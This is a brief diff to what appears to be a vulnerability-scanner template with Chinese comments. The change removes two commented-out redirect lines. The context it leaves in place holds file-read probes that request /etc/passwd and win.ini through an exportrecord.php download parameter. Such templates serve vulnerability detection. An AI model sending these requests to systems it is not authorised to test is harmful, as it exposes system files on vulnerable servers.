@@ -38,8 +38,6 @@ http:
 # http 请求
   - method: GET
     # 请求方法
-    # redirects: true
-    # 允许重定向 默认不执行重定向
     path:
       - "{{BaseURL}}/php/exportrecord.php?downtype=10&downname=/etc/passwd"
       - "{{BaseURL}}/php/exportrecord.php?downtype=10&downname=C://Windows//win.ini"
